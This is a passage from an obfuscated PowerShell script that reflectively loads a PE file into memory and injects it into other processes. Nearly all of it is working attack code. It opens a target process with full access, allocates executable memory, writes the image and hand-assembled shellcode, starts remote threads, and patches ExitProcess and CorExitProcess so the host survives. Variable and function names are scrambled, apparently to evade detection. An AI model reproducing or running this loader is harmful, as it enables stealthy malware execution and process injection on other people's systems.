        $YokgFkKj99.VirtualProtect.Invoke($tuWrxdGF99, [UInt32]$qjqAeCsI99, [UInt32]$GPIsvIhG99, [Ref]$GPIsvIhG99) | Out-Null

        $vjSMRUSt99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $vjSMRUSt99)
        {
            [IntPtr]$vTGkdBgH99 = $YokgFkKj99.GetModuleHandle.Invoke($Dll)
            if ($vTGkdBgH99 -ne [IntPtr]::Zero)
            {
                [IntPtr]$lgdgsFGJ99 = $YokgFkKj99.GetProcAddress.Invoke($vTGkdBgH99, "_wcmdln")
                [IntPtr]$xFUsbfNg99 = $YokgFkKj99.GetProcAddress.Invoke($vTGkdBgH99, "_acmdln")
                if ($lgdgsFGJ99 -eq [IntPtr]::Zero -or $xFUsbfNg99 -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $GlBZnSrh99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($qYQiJIbR99)
                $wWFwAEjL99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($qYQiJIbR99)

                $QFaqMGri99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xFUsbfNg99, [Type][IntPtr])
                $aSGXIWQa99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($lgdgsFGJ99, [Type][IntPtr])
                $EtJfYElD99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SjsRrlTg99)
                $tdRMrESi99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SjsRrlTg99)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($QFaqMGri99, $EtJfYElD99, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($aSGXIWQa99, $tdRMrESi99, $false)
                $HmNKCNVD99 += ,($xFUsbfNg99, $EtJfYElD99, $SjsRrlTg99)
                $HmNKCNVD99 += ,($lgdgsFGJ99, $tdRMrESi99, $SjsRrlTg99)

                $BjJZNTzC99 = $YokgFkKj99.VirtualProtect.Invoke($xFUsbfNg99, [UInt32]$SjsRrlTg99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$GPIsvIhG99)
                if ($BjJZNTzC99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($GlBZnSrh99, $xFUsbfNg99, $false)
                $YokgFkKj99.VirtualProtect.Invoke($xFUsbfNg99, [UInt32]$SjsRrlTg99, [UInt32]($GPIsvIhG99), [Ref]$GPIsvIhG99) | Out-Null

                $BjJZNTzC99 = $YokgFkKj99.VirtualProtect.Invoke($lgdgsFGJ99, [UInt32]$SjsRrlTg99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$GPIsvIhG99)
                if ($BjJZNTzC99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($wWFwAEjL99, $lgdgsFGJ99, $false)
                $YokgFkKj99.VirtualProtect.Invoke($lgdgsFGJ99, [UInt32]$SjsRrlTg99, [UInt32]($GPIsvIhG99), [Ref]$GPIsvIhG99) | Out-Null
            }
        }


        $HmNKCNVD99 = @()
        $VZByOjeg99 = @() #Array of functions to overwrite so the thread doesn't exit the process

        [IntPtr]$jNCUihpC99 = $YokgFkKj99.GetModuleHandle.Invoke("mscoree.dll")
        if ($jNCUihpC99 -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$tfxAPrbN99 = $YokgFkKj99.GetProcAddress.Invoke($jNCUihpC99, "CorExitProcess")
        if ($tfxAPrbN99 -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $VZByOjeg99 += $tfxAPrbN99

        [IntPtr]$yCKpGsyz99 = $YokgFkKj99.GetProcAddress.Invoke($iYisJnbh99, "ExitProcess")
        if ($yCKpGsyz99 -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $VZByOjeg99 += $yCKpGsyz99

        [UInt32]$GPIsvIhG99 = 0
        foreach ($YpVCTYOb99 in $VZByOjeg99)
        {
            $qsXCNsjr99 = $YpVCTYOb99
            [Byte[]]$UcgPyqfj99 = @(0xbb)
            [Byte[]]$DDOuHCgt99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            if ($SjsRrlTg99 -eq 8)
            {
                [Byte[]]$UcgPyqfj99 = @(0x48, 0xbb)
                [Byte[]]$DDOuHCgt99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$eijWLRet99 = @(0xff, 0xd3)
            $qjqAeCsI99 = $UcgPyqfj99.Length + $SjsRrlTg99 + $DDOuHCgt99.Length + $SjsRrlTg99 + $eijWLRet99.Length

            [IntPtr]$TZcGCHAD99 = $YokgFkKj99.GetProcAddress.Invoke($iYisJnbh99, "ExitThread")
            if ($TZcGCHAD99 -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $BjJZNTzC99 = $YokgFkKj99.VirtualProtect.Invoke($YpVCTYOb99, [UInt32]$qjqAeCsI99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$GPIsvIhG99)
            if ($BjJZNTzC99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $FYrWZcNV99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($qjqAeCsI99)
            $YokgFkKj99.memcpy.Invoke($FYrWZcNV99, $YpVCTYOb99, [UInt64]$qjqAeCsI99) | Out-Null
            $HmNKCNVD99 += ,($YpVCTYOb99, $FYrWZcNV99, $qjqAeCsI99)

            shirker -Bytes $UcgPyqfj99 -gPxdFgeU99 $qsXCNsjr99
            $qsXCNsjr99 = elastic $qsXCNsjr99 ($UcgPyqfj99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($CIBvEfZI99, $qsXCNsjr99, $false)
            $qsXCNsjr99 = elastic $qsXCNsjr99 $SjsRrlTg99
            shirker -Bytes $DDOuHCgt99 -gPxdFgeU99 $qsXCNsjr99
            $qsXCNsjr99 = elastic $qsXCNsjr99 ($DDOuHCgt99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TZcGCHAD99, $qsXCNsjr99, $false)
            $qsXCNsjr99 = elastic $qsXCNsjr99 $SjsRrlTg99
            shirker -Bytes $eijWLRet99 -gPxdFgeU99 $qsXCNsjr99

            $YokgFkKj99.VirtualProtect.Invoke($YpVCTYOb99, [UInt32]$qjqAeCsI99, [UInt32]$GPIsvIhG99, [Ref]$GPIsvIhG99) | Out-Null
        }

        Write-Output $HmNKCNVD99
    }

    Function amnestying
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $LUMdHTYF99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $YokgFkKj99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$GPIsvIhG99 = 0
        foreach ($Info in $LUMdHTYF99)
        {
            $BjJZNTzC99 = $YokgFkKj99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$GPIsvIhG99)
            if ($BjJZNTzC99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $YokgFkKj99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $YokgFkKj99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$GPIsvIhG99, [Ref]$GPIsvIhG99) | Out-Null
        }
    }


    Function greasiness
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $nrZUEnxp99,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $gbwmFOmN99 = jab
        $Win32Constants = frankfurters
        $PEInfo = oxidizers -nrZUEnxp99 $nrZUEnxp99 -gbwmFOmN99 $gbwmFOmN99 -Win32Constants $Win32Constants

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $UKoOeJQd99 = elastic ($nrZUEnxp99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $rhzLDbkz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($UKoOeJQd99, [Type]$gbwmFOmN99.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $rhzLDbkz99.NumberOfNames; $i++)
        {
            $tUqrJeru99 = elastic ($nrZUEnxp99) ($rhzLDbkz99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $eHAaDAYh99 = elastic ($nrZUEnxp99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($tUqrJeru99, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($eHAaDAYh99)

            if ($Name -ceq $FunctionName)
            {
                $vOutSMXH99 = elastic ($nrZUEnxp99) ($rhzLDbkz99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $OdtBVtkL99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($vOutSMXH99, [Type][UInt16])
                $wrQtgofk99 = elastic ($nrZUEnxp99) ($rhzLDbkz99.AddressOfFunctions + ($OdtBVtkL99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $MLDdSQmq99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($wrQtgofk99, [Type][UInt32])
                return elastic ($nrZUEnxp99) ($MLDdSQmq99)
            }
        }

        return [IntPtr]::Zero
    }


    Function dyslexia
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $CVDncjuZ99,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $fjeCFrVH99,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $hTcxIZqi99,

        [Parameter(Position = 3)]
        [Bool]
        $ueHcUoLs99 = $false
        )

        $SjsRrlTg99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $Win32Constants = frankfurters
        $YokgFkKj99 = serer
        $gbwmFOmN99 = jab

        $vaNWervY99 = $false
        if (($hTcxIZqi99 -ne $null) -and ($hTcxIZqi99 -ne [IntPtr]::Zero))
        {
            $vaNWervY99 = $true
        }

        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = academic -CVDncjuZ99 $CVDncjuZ99 -gbwmFOmN99 $gbwmFOmN99
        $KHphfewN99 = $PEInfo.OriginalImageBase
        $aRRUcmxQ99 = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $aRRUcmxQ99 = $false
        }

        $veAUeLUN99 = $true
        if ($vaNWervY99 -eq $true)
        {
            $iYisJnbh99 = $YokgFkKj99.GetModuleHandle.Invoke("kernel32.dll")
            $vfVoYjxw99 = $YokgFkKj99.GetProcAddress.Invoke($iYisJnbh99, "IsWow64Process")
            if ($vfVoYjxw99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$KRFiSKuD99 = $false
            $BjJZNTzC99 = $YokgFkKj99.IsWow64Process.Invoke($hTcxIZqi99, [Ref]$KRFiSKuD99)
            if ($BjJZNTzC99 -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($KRFiSKuD99 -eq $true) -or (($KRFiSKuD99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $veAUeLUN99 = $false
            }

            $KPndBzrx99 = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $KPndBzrx99 = $false
            }
            if ($KPndBzrx99 -ne $veAUeLUN99)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $veAUeLUN99 = $false
            }
        }
        if ($veAUeLUN99 -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }

        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        [IntPtr]$PwjrfdlU99 = [IntPtr]::Zero
        $VWqxTjRo99 = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ueHcUoLs99) -and (-not $VWqxTjRo99))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ueHcUoLs99 flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$PwjrfdlU99 = $KHphfewN99
        }
        elseif ($ueHcUoLs99 -and (-not $VWqxTjRo99))
        {
            Write-Verbose "PE file doesn't support ASLR but -ueHcUoLs99 is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ueHcUoLs99 -and $vaNWervY99)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($vaNWervY99 -and (-not $VWqxTjRo99))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $nrZUEnxp99 = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $SLeUNfCY99 = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $nrZUEnxp99. If it is loaded in a remote process, this is the address in the remote process.
        if ($vaNWervY99 -eq $true)
        {
            $nrZUEnxp99 = $YokgFkKj99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            $SLeUNfCY99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, $PwjrfdlU99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($SLeUNfCY99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($aRRUcmxQ99 -eq $true)
            {
                $nrZUEnxp99 = $YokgFkKj99.VirtualAlloc.Invoke($PwjrfdlU99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $nrZUEnxp99 = $YokgFkKj99.VirtualAlloc.Invoke($PwjrfdlU99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $SLeUNfCY99 = $nrZUEnxp99
        }

        [IntPtr]$iSXQrUxP99 = elastic ($nrZUEnxp99) ([Int64]$PEInfo.SizeOfImage)
        if ($nrZUEnxp99 -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($CVDncjuZ99, 0, $nrZUEnxp99, $PEInfo.SizeOfHeaders) | Out-Null


        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = oxidizers -nrZUEnxp99 $nrZUEnxp99 -gbwmFOmN99 $gbwmFOmN99 -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $iSXQrUxP99
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $SLeUNfCY99
        Write-Verbose "StartAddress: $(astonishingly $nrZUEnxp99)    EndAddress: $(astonishingly $iSXQrUxP99)"


        Write-Verbose "Copy PE sections in to memory"
        safeguarded -CVDncjuZ99 $CVDncjuZ99 -PEInfo $PEInfo -YokgFkKj99 $YokgFkKj99 -gbwmFOmN99 $gbwmFOmN99


        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        pterodactyls -PEInfo $PEInfo -KHphfewN99 $KHphfewN99 -Win32Constants $Win32Constants -gbwmFOmN99 $gbwmFOmN99


        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($vaNWervY99 -eq $true)
        {
            pennon -PEInfo $PEInfo -YokgFkKj99 $YokgFkKj99 -gbwmFOmN99 $gbwmFOmN99 -Win32Constants $Win32Constants -hTcxIZqi99 $hTcxIZqi99
        }
        else
        {
            pennon -PEInfo $PEInfo -YokgFkKj99 $YokgFkKj99 -gbwmFOmN99 $gbwmFOmN99 -Win32Constants $Win32Constants
        }


        if ($vaNWervY99 -eq $false)
        {
            if ($aRRUcmxQ99 -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                tromps -PEInfo $PEInfo -YokgFkKj99 $YokgFkKj99 -Win32Constants $Win32Constants -gbwmFOmN99 $gbwmFOmN99
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        if ($vaNWervY99 -eq $true)
        {
            [UInt32]$VqeUSBMM99 = 0
            $BjJZNTzC99 = $YokgFkKj99.WriteProcessMemory.Invoke($hTcxIZqi99, $SLeUNfCY99, $nrZUEnxp99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$VqeUSBMM99)
            if ($BjJZNTzC99 -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($vaNWervY99 -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $wBhcaiHw99 = elastic ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $ujtkGFEr99 = gentler @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $PwMADbYx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wBhcaiHw99, $ujtkGFEr99)

                $PwMADbYx99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $wBhcaiHw99 = elastic ($SLeUNfCY99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    $cheOwGVo99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $EPQPDWVB99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $bbBexmKH99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    $cheOwGVo99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $EPQPDWVB99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $bbBexmKH99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $HOBbxkho99 = $cheOwGVo99.Length + $EPQPDWVB99.Length + $bbBexmKH99.Length + ($SjsRrlTg99 * 2)
                $HsgHcXzd99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HOBbxkho99)
                $yPiEoovV99 = $HsgHcXzd99

                shirker -Bytes $cheOwGVo99 -gPxdFgeU99 $HsgHcXzd99
                $HsgHcXzd99 = elastic $HsgHcXzd99 ($cheOwGVo99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($SLeUNfCY99, $HsgHcXzd99, $false)
                $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
                shirker -Bytes $EPQPDWVB99 -gPxdFgeU99 $HsgHcXzd99
                $HsgHcXzd99 = elastic $HsgHcXzd99 ($EPQPDWVB99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($wBhcaiHw99, $HsgHcXzd99, $false)
                $HsgHcXzd99 = elastic $HsgHcXzd99 ($SjsRrlTg99)
                shirker -Bytes $bbBexmKH99 -gPxdFgeU99 $HsgHcXzd99
                $HsgHcXzd99 = elastic $HsgHcXzd99 ($bbBexmKH99.Length)

                $EKgGeOpZ99 = $YokgFkKj99.VirtualAllocEx.Invoke($hTcxIZqi99, [IntPtr]::Zero, [UIntPtr][UInt64]$HOBbxkho99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($EKgGeOpZ99 -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $BjJZNTzC99 = $YokgFkKj99.WriteProcessMemory.Invoke($hTcxIZqi99, $EKgGeOpZ99, $yPiEoovV99, [UIntPtr][UInt64]$HOBbxkho99, [Ref]$VqeUSBMM99)
                if (($BjJZNTzC99 -eq $false) -or ([UInt64]$VqeUSBMM99 -ne [UInt64]$HOBbxkho99))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $YjqbtwZj99 = virtual -TUzdqtBB99 $hTcxIZqi99 -StartAddress $EKgGeOpZ99 -YokgFkKj99 $YokgFkKj99
                $vfVoYjxw99 = $YokgFkKj99.WaitForSingleObject.Invoke($YjqbtwZj99, 20000)
                if ($vfVoYjxw99 -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $YokgFkKj99.VirtualFreeEx.Invoke($hTcxIZqi99, $EKgGeOpZ99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            [IntPtr]$CIBvEfZI99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($CIBvEfZI99, 0, 0x00)
            $TPywKLey99 = barracks -PEInfo $PEInfo -YokgFkKj99 $YokgFkKj99 -Win32Constants $Win32Constants -qYQiJIbR99 $fjeCFrVH99 -CIBvEfZI99 $CIBvEfZI99

            [IntPtr]$rrZmrZcL99 = elastic ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(astonishingly $rrZmrZcL99). Creating thread for the EXE to run in."

            $YokgFkKj99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $rrZmrZcL99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$sbayEXLi99 = [System.Runtime.InteropServices.Marshal]::ReadByte($CIBvEfZI99, 0)
                if ($sbayEXLi99 -eq 1)
                {
                    amnestying -LUMdHTYF99 $TPywKLey99 -YokgFkKj99 $YokgFkKj99 -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $SLeUNfCY99)
    }


    Function Z
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $nrZUEnxp99
        )

        $Win32Constants = frankfurters
        $YokgFkKj99 = serer
        $gbwmFOmN99 = jab

        $PEInfo = oxidizers -nrZUEnxp99 $nrZUEnxp99 -gbwmFOmN99 $gbwmFOmN99 -Win32Constants $Win32Constants

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$zwziMmkj99 = elastic ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $cKNqCont99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zwziMmkj99, [Type]$gbwmFOmN99.IMAGE_IMPORT_DESCRIPTOR)

                if ($cKNqCont99.Characteristics -eq 0 `
                        -and $cKNqCont99.FirstThunk -eq 0 `
                        -and $cKNqCont99.ForwarderChain -eq 0 `
                        -and $cKNqCont99.Name -eq 0 `
                        -and $cKNqCont99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $fWjWKxKV99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((elastic ([Int64]$PEInfo.PEHandle) ([Int64]$cKNqCont99.Name)))
                $xORxqlAj99 = $YokgFkKj99.GetModuleHandle.Invoke($fWjWKxKV99)

                if ($xORxqlAj99 -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $fWjWKxKV99. Continuing anyways" -WarningAction Continue
                }

                $BjJZNTzC99 = $YokgFkKj99.FreeLibrary.Invoke($xORxqlAj99)
                if ($BjJZNTzC99 -eq $false)
                {
                    Write-Warning "Unable to free library: $fWjWKxKV99. Continuing anyways." -WarningAction Continue
                }

                $zwziMmkj99 = elastic ($zwziMmkj99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$gbwmFOmN99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $wBhcaiHw99 = elastic ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $ujtkGFEr99 = gentler @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $PwMADbYx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wBhcaiHw99, $ujtkGFEr99)

        $PwMADbYx99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $BjJZNTzC99 = $YokgFkKj99.VirtualFree.Invoke($nrZUEnxp99, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($BjJZNTzC99 -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $YokgFkKj99 = serer
        $gbwmFOmN99 = jab
        $Win32Constants =  frankfurters

        $hTcxIZqi99 = [IntPtr]::Zero

        if (($exsasvkm99 -ne $null) -and ($exsasvkm99 -ne 0) -and ($VlMSmfKv99 -ne $null) -and ($VlMSmfKv99 -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($VlMSmfKv99 -ne $null -and $VlMSmfKv99 -ne "")
        {
            $NQMFOxpx99 = @(Get-Process -Name $VlMSmfKv99 -ErrorAction SilentlyContinue)
            if ($NQMFOxpx99.Count -eq 0)
            {
                Throw "Can't find process $VlMSmfKv99"
            }
            elseif ($NQMFOxpx99.Count -gt 1)
            {
                $bwRYzgCk99 = Get-Process | Where-Object { $_.Name -eq $VlMSmfKv99 } | Select-Object ProcessName, Id, SessionId
                Write-Output $bwRYzgCk99
                Throw "More than one instance of $VlMSmfKv99 found, please specify the process ID to inject in to."
            }
            else
            {
                $exsasvkm99 = $NQMFOxpx99[0].ID
            }
        }


        if (($exsasvkm99 -ne $null) -and ($exsasvkm99 -ne 0))
        {
            $hTcxIZqi99 = $YokgFkKj99.OpenProcess.Invoke(0x001F0FFF, $false, $exsasvkm99)
            if ($hTcxIZqi99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $exsasvkm99"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        Write-Verbose "Calling dyslexia"
        $nrZUEnxp99 = [IntPtr]::Zero
        if ($hTcxIZqi99 -eq [IntPtr]::Zero)
        {
            $UzTkTRPe99 = dyslexia -CVDncjuZ99 $CVDncjuZ99 -fjeCFrVH99 $fjeCFrVH99 -ueHcUoLs99 $ueHcUoLs99
        }
        else
        {
            $UzTkTRPe99 = dyslexia -CVDncjuZ99 $CVDncjuZ99 -fjeCFrVH99 $fjeCFrVH99 -hTcxIZqi99 $hTcxIZqi99 -ueHcUoLs99 $ueHcUoLs99
        }
        if ($UzTkTRPe99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $nrZUEnxp99 = $UzTkTRPe99[0]
        $QQCKOyFu99 = $UzTkTRPe99[1] #only matters if you loaded in to a remote process


        $PEInfo = oxidizers -nrZUEnxp99 $nrZUEnxp99 -gbwmFOmN99 $gbwmFOmN99 -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($hTcxIZqi99 -eq [IntPtr]::Zero))
        {
            switch ($KvjRRenh99)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$ejtRvCAf99 = greasiness -nrZUEnxp99 $nrZUEnxp99 -FunctionName "WStringFunc"
                    if ($ejtRvCAf99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
